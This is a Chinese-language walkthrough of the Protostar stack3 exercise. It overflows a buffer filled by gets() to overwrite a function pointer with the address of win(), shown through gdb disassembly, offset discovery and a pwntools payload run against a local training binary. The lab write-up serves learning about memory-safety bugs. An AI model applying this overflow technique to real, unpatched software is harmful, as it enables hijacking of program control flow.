---
title: Protostar_stack3
updated: 2024-02-18 08:47:59Z
created: 2023-11-07 11:37:55Z
---

**运行该程序，得到：**

<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/fd20d5017e983f4e3989e72748790aed.png" alt="fd20d5017e983f4e3989e72748790aed.png" width="188" height="44" class="jop-noMdConv">

**checksec:**

<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/b4ffe4d135417fa767acccdbc6bb7faa.png" alt="b4ffe4d135417fa767acccdbc6bb7faa.png" width="286" height="119" class="jop-noMdConv">

**objdump:**

```
└─$ objdump -t -j .text stack3

stack3:     file format elf32-i386

SYMBOL TABLE:
08048370 l    d  .text  00000000              .text
080483a0 l     F .text  00000000              __do_global_dtors_aux
08048400 l     F .text  00000000              frame_dummy
080484f0 l     F .text  00000000              __do_global_ctors_aux
08048480 g     F .text  00000005              __libc_csu_fini
08048370 g     F .text  00000000              _start
08048424 g     F .text  00000014              win
08048490 g     F .text  0000005a              __libc_csu_init
080484ea g     F .text  00000000              .hidden __i686.get_pc_thunk.bx
08048438 g     F .text  00000041              main
```

**查看汇编代码:**

```
gdb-peda$ disass main
Dump of assembler code for function main:
   0x08048438 <+0>:     push   ebp
   0x08048439 <+1>:     mov    ebp,esp
   0x0804843b <+3>:     and    esp,0xfffffff0
   0x0804843e <+6>:     sub    esp,0x60
   0x08048441 <+9>:     mov    DWORD PTR [esp+0x5c],0x0
   0x08048449 <+17>:    lea    eax,[esp+0x1c]
   0x0804844d <+21>:    mov    DWORD PTR [esp],eax
   0x08048450 <+24>:    call   0x8048330 <gets@plt>
   0x08048455 <+29>:    cmp    DWORD PTR [esp+0x5c],0x0
   0x0804845a <+34>:    je     0x8048477 <main+63>
   0x0804845c <+36>:    mov    eax,0x8048560
   0x08048461 <+41>:    mov    edx,DWORD PTR [esp+0x5c]
   0x08048465 <+45>:    mov    DWORD PTR [esp+0x4],edx
   0x08048469 <+49>:    mov    DWORD PTR [esp],eax
   0x0804846c <+52>:    call   0x8048350 <printf@plt>
   0x08048471 <+57>:    mov    eax,DWORD PTR [esp+0x5c]
   0x08048475 <+61>:    call   eax
   0x08048477 <+63>:    leave
   0x08048478 <+64>:    ret
End of assembler dump.
gdb-peda$ disass win
Dump of assembler code for function win:
   0x08048424 <+0>:     push   ebp
   0x08048425 <+1>:     mov    ebp,esp
   0x08048427 <+3>:     sub    esp,0x18
   0x0804842a <+6>:     mov    DWORD PTR [esp],0x8048540
   0x08048431 <+13>:    call   0x8048360 <puts@plt>
   0x08048436 <+18>:    leave
   0x08048437 <+19>:    ret
End of assembler dump.
```

**查看反编译代码:**

```
void main(void)
{
    undefined auStack84 [64];
    code *pcStack20;
    
    pcStack20 = (code *)0x0;
    gets(auStack84);
    if (pcStack20 != (code *)0x0) {
        printf("calling function pointer, jumping to 0x%08x\n", pcStack20);
        (*pcStack20)();
    }
    return;
}
```

```
void win(void)
{
    puts("code flow successfully changed");
    return;
}
```

本题目是获取输入并传递给 `auStack84 [64]`数组，由于使用了不安全的`gets`函数(其并没有检测输入的长度)，所以以输入过长的数据用以达到溢出的目的，从而修改`pcStack20`的值

在通过溢出修改`pcStack20`的值后，就可以进入 `if (pcStack20 != (code *)0x0)` ，从而执行被修改后的`pcStack20`指向的地址

**接下来，我们获取需要进行溢出的缓冲区的大小：**

```
gdb-peda$ pattern_create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
gdb-peda$ file stack3
Reading symbols from stack3...
gdb-peda$ run
Starting program: /opt/protostar/bin/stack3 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
calling function pointer, jumping to 0x41644141
。。。。。。


[----------------------------------registers-----------------------------------]
EAX: 0x41644141 ('AAdA')
EBX: 0xf7e1dff4 --> 0x21dd8c 
ECX: 0xffffce7c --> 0x7363be00 
EDX: 0x1 
ESI: 0x8048490 (<__libc_csu_init>:      push   ebp)
EDI: 0xf7ffcba0 --> 0x0 
EBP: 0xffffcf28 ("AA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
ESP: 0xffffcebc --> 0x8048477 (<main+63>:       leave)
EIP: 0x41644141 ('AAdA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41644141
[------------------------------------stack-------------------------------------]
0000| 0xffffcebc --> 0x8048477 (<main+63>:      leave)
0004| 0xffffcec0 --> 0x8048560 ("calling function pointer, jumping to 0x%08x\n")
0008| 0xffffcec4 ("AAdA\350\325\377\367\034")
0012| 0xffffcec8 --> 0xf7ffd5e8 --> 0xf7fca000 --> 0x464c457f 
0016| 0xffffcecc --> 0x1c 
0020| 0xffffced0 --> 0xf7ffcff4 --> 0x32f34 
0024| 0xffffced4 --> 0xc ('\x0c')
0028| 0xffffced8 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41644141 in ?? ()
```

&nbsp;可以看到`Invalid $PC address: 0x41644141`

求其偏移长度：

```
gdb-peda$ pattern_offset 0x41644141
1097089345 found at offset: 64
```

即需要溢出的长度为64,我们还需要win函数的地址，这个已经在上面找到，即`0x08048424`：

```
gdb-peda$ disass win
Dump of assembler code for function win:
   0x08048424 <+0>:     push   ebp
```

**PS:0x08048424需要写成小端序**

exp如下：

```
In [1]: from pwn import *

In [2]: payload = 'A'*64 + '\x24\x84\x04\x08'

In [3]: sh = process("./stack3")
[x] Starting local process './stack3'
[+] Starting local process './stack3': pid 204414

In [4]: sh.sendline(payload)
<ipython-input-4-96fbe51e0736>:1: BytesWarning: Text is not bytes; assuming ISO-8859-1, no guarantees. See https://docs.pwntools.com/#bytes
  sh.sendline(payload)

In [5]: sh.recvall()
[x] Receiving all data
[x] Receiving all data: 0B
[*] Process './stack3' stopped with exit code 31 (pid 204414)
[x] Receiving all data: 79B
[+] Receiving all data: Done (79B)
Out[5]: b'calling function pointer, jumping to 0x08048424\ncode flow successfully changed\n'
```

&nbsp;